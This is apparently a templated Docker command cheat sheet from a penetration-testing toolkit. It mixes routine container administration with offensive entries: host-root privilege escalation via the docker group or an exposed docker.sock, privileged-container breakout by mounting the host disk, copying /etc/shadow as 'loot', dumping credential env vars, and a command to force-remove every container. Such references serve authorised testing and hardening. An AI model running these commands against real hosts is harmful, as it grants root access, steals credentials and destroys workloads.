# Docker

> Container platform for building, running, and managing isolated application environments

<!-- tags: docker, container, image, compose, devops -->

---

## run container interactive shell
Run a container with interactive terminal and auto-remove on exit.

```bash
docker run -it --rm --name {{NAME:str:mybox}} {{IMAGE:choice:ubuntu:latest=Ubuntu base,alpine:latest=Alpine base,debian:latest=Debian base,kalilinux/kali-rolling=Kali rolling,busybox:latest=BusyBox tools,python:3=Python 3 runtime,node:latest=Node.js runtime}} /bin/bash
```

<!-- meta: risk=low | phase=misc | tags=run,interactive,shell -->

---

## run container port volume mount
Run a container with port mapping and volume mount.

```bash
docker run -d --name {{NAME:str:webapp}} -p {{HPORT:port:8080}}:{{CPORT:port:80}} -v {{HOSTPATH:dir:./data}}:{{CONTPATH:str:/app/data}} {{IMAGE:choice:nginx:latest=Nginx web server,httpd:latest=Apache httpd,caddy:latest=Caddy HTTPS server,traefik:latest=Traefik reverse proxy,haproxy:latest=HAProxy load balancer,redis:latest=Redis KV store,postgres:latest=PostgreSQL DB,mysql:latest=MySQL DB}}
```

<!-- meta: risk=low | phase=misc | tags=run,port,volume,mount -->

---

## exec shell running container
Open a shell in an already-running container.

```bash
docker exec -it {{CONTAINER:str:webapp}} /bin/bash
```

<!-- meta: risk=low | phase=misc | tags=exec,shell,attach -->

---

## build image dockerfile
Build a Docker image from a Dockerfile.

```bash
docker build -t {{TAG:str:myimage:latest}} {{PATH:dir:.}}
```

<!-- meta: risk=low | phase=misc | tags=build,image,dockerfile -->

---

## list containers and images
Show running containers and available images.

```bash
docker ps -a && docker images
```

<!-- meta: risk=safe | phase=misc | tags=ps,list,images,containers -->

---

## view container logs
Stream logs from a running container.

```bash
docker logs -f --tail {{LINES:int:100}} {{CONTAINER:str:webapp}}
```

<!-- meta: risk=safe | phase=misc | tags=logs,follow,debug -->

---

## stop and remove container
Stop a running container and remove it.

```bash
docker stop {{CONTAINER:str:webapp}} && docker rm {{CONTAINER:str:webapp}}
```

<!-- meta: risk=med | phase=misc | tags=stop,remove,cleanup -->

---

## compose up services
Start all services defined in a compose file.

```bash
docker compose -f {{FILE:file:docker-compose.yml}} up -d
```

<!-- meta: risk=low | phase=misc | tags=compose,up,services -->

---

## compose down volumes
Stop and remove all containers, networks, and volumes from compose.

```bash
docker compose -f {{FILE:file:docker-compose.yml}} down --volumes
```

<!-- meta: risk=med | phase=misc | tags=compose,down,cleanup -->

---

## prune system disk cleanup
Remove all stopped containers, unused networks, dangling images, and build cache.

```bash
docker system prune -af --volumes
```

<!-- meta: risk=high | phase=misc | tags=prune,cleanup,disk -->

---

## list inspect networks
List, create, and inspect Docker networks.

```bash
docker network ls && docker network inspect {{NETWORK:choice:bridge=default NAT bridge,host=host networking,none=isolated (no net),overlay=Swarm overlay,macvlan=direct MAC vlan,ipvlan=direct IP vlan}}
```

<!-- meta: risk=safe | phase=misc | tags=network,inspect,list -->

---

## privesc mount host root
Abuse docker group membership to mount the host filesystem and drop into a root shell.

```bash
docker run -v /:/mnt --rm -it {{IMAGE:choice:alpine=Alpine base,busybox=BusyBox tools,debian:slim=Debian slim,ubuntu:latest=Ubuntu base}} chroot /mnt sh
```

<!-- meta: risk=high | phase=privesc | tags=privesc,docker-group,mount,root,escape -->

---

## abuse exposed socket privesc
Spawn a host-mounted root shell through an exposed Docker socket (e.g. mounted into a container).

```bash
docker -H unix://{{SOCKET:str:/var/run/docker.sock}} run -v /:/host --rm -it {{IMAGE:choice:alpine=Alpine base,busybox=BusyBox tools,debian:slim=Debian slim,ubuntu:latest=Ubuntu base}} chroot /host sh
```

<!-- meta: risk=high | phase=privesc | tags=privesc,socket,dockersock,escape -->

---

## check inside container
Detect whether the current shell is running inside a container.

```bash
ls -la /.dockerenv 2>/dev/null; grep -aE 'docker|lxc|kubepods' /proc/1/cgroup 2>/dev/null
```

<!-- meta: risk=safe | phase=enum | tags=enum,container,detect -->

---

## escape privileged container
From inside a --privileged container, mount the host disk and chroot into it.

```bash
fdisk -l; mount /dev/{{DISK:choice:sda1=SATA disk 1 part 1,sda2=SATA disk 1 part 2,sdb1=SATA disk 2 part 1,nvme0n1p1=NVMe disk 1 part 1,xvda1=Xen vDisk part 1,vda1=KVM vDisk part 1}} /mnt && chroot /mnt sh
```

<!-- meta: risk=high | phase=privesc | tags=escape,privileged,breakout,mount -->

---

## copy file from container
Pull a file out of a container to the host for loot.

```bash
docker cp {{CONTAINER:str:webapp}}:{{PATH:str:/etc/shadow}} ./loot
```

<!-- meta: risk=low | phase=post | tags=loot,cp,exfil,file -->

---

## dump container env secrets
Read environment variables (often creds or tokens) from a container's config.

```bash
docker inspect {{CONTAINER:str:webapp}} | grep -A40 '"Env"'
```

<!-- meta: risk=low | phase=enum | tags=secrets,env,inspect,creds -->

---

## mount container rootfs browse
A running container's root filesystem is already mounted on the host (overlay merged dir). Resolve its path and browse the files as root — no exec needed.

```bash
d=$(docker inspect {{CONTAINER:str:webapp}} | grep -oP '"MergedDir":\s*"\K[^"]+'); echo "$d"; sudo ls -la "$d"
```

<!-- meta: risk=low | phase=post | tags=mount,rootfs,overlay,mergeddir,files,inside -->

---

## extract container filesystem
Export a container's entire filesystem into a local directory you can cd into and browse (works on stopped containers too).

```bash
mkdir -p {{OUTDIR:dir:./rootfs}} && docker export {{CONTAINER:str:webapp}} | tar -C {{OUTDIR:dir:./rootfs}} -xf - && ls -la {{OUTDIR:dir:./rootfs}}
```

<!-- meta: risk=low | phase=post | tags=export,extract,filesystem,files,mount,inside -->

---

## extract image filesystem
Unpack an image's filesystem without running it: create a throwaway container, export it, extract, clean up.

```bash
mkdir -p {{OUTDIR:dir:./rootfs}} && docker create --name tmp_extract {{IMAGE:str:target:latest}} && docker export tmp_extract | tar -C {{OUTDIR:dir:./rootfs}} -xf - ; docker rm tmp_extract
```

<!-- meta: risk=low | phase=post | tags=image,extract,filesystem,unpack,files -->

---

## run image shell override entrypoint
Get an interactive shell inside an image even when it has an ENTRYPOINT that would otherwise auto-start an app. Run Linux commands locally in the container.

```bash
docker run -it --rm --entrypoint {{SHELL:choice:bash=Bourne-Again shell,sh=POSIX shell,ash=Alpine Almquist shell,zsh=Z shell,dash=Debian shell,fish=friendly shell}} {{IMAGE:str:target:latest}}
```

<!-- meta: risk=low | phase=post | tags=run,shell,entrypoint,interactive,inside,bash -->

## list all containers running plus stopped
One table: names, images, status, published ports. First thing you run on a docker host.

```bash
docker ps -a --format 'table {{"{{"}}.Names{{"}}"}}\t{{"{{"}}.Image{{"}}"}}\t{{"{{"}}.Status{{"}}"}}\t{{"{{"}}.Ports{{"}}"}}'
```

<!-- meta: risk=low | phase=recon | tags=docker,ps,list,containers -->

---

## delete containers all or one
Single command with a mode selector — pick `all` to nuke every container on the host, or `single` to remove one by name. When mode=all the CONTAINER prompt is decorative (just Enter through it).

```bash
mode={{MODE:choice:all=nuke EVERY container,single=remove ONE named container}}; c={{CONTAINER:str:only-used-when-single}}; case "$mode" in all) docker ps -aq | xargs -r docker rm -f && echo '[+] all containers removed' ;; single) docker rm -f "$c" && echo "[+] removed $c" ;; esac
```

<!-- meta: risk=high | phase=post | tags=docker,rm,delete,cleanup -->

---

## shell into running container
Drop into an interactive `/bin/sh` inside a running container. Change to `/bin/bash` at fill time if the target has bash.

```bash
docker exec -it {{CONTAINER:str}} /bin/sh
```

<!-- meta: risk=low | phase=post | tags=docker,exec,shell,interactive -->

---

## escape check container privileges
One-shot check for the six configs that matter for container escape: Privileged flag, added capabilities, host bind-mounts, shared host PID/IPC/Network. If any of these light up you have a way out.

```bash
docker inspect {{CONTAINER:str}} | jq '.[] | {Privileged:.HostConfig.Privileged, CapAdd:.HostConfig.CapAdd, Binds:.HostConfig.Binds, PidMode:.HostConfig.PidMode, IpcMode:.HostConfig.IpcMode, NetworkMode:.HostConfig.NetworkMode}'
```

<!-- meta: risk=medium | phase=post | tags=docker,escape,privileged,capabilities,inspect -->
